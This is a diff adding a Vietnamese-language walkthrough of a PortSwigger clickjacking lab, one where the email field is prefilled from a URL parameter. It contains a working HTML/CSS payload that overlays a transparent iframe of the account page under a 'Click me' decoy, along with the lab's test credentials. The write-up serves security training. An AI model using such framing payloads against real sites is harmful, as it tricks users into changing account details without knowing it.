@@ -42,3 +42,45 @@ Khi view Exploit ta sẽ thấy phần chữ "Click" ở đúng vi trí của "D
 LAB SOLVED!
 
 <img width="594" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/532f04d4-86bb-49a1-aae0-af88ae23fa1f">
+
+***
+
+## 2. Lab: Clickjacking with form input data prefilled from a URL parameter
+
+* Content:
+```
+This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
+
+To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
+
+You can log in to your own account using the following credentials: wiener:peter
+```
+* Exploit:
+
+Dùng payload sau, prefill trước parametter email (bằng GET method trong link URL) để content email được fill vào trước trong ô input:
+
+```
+<style>
+    iframe {
+        position:relative;
+        width: 700px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top: 450px;
+        left: 60px;
+        z-index: 1;
+    }
+</style>
+<div>Test me</div>
+<iframe src="https://0ab8008003451981827cb51f00e80071.web-security-academy.net/my-account/?email=ndkhai%40test1.net"></iframe>
+```
+
+<img width="355" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7b696408-947b-4852-9014-ac9488c97b6b">
+
+Chuyển nội dung từ `Test me` =>  `Click me` rồi Deliver To Victim => LAB SOLVED!
+
+<img width="579" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/69331c6a-49c9-4164-ad29-534592a14448">
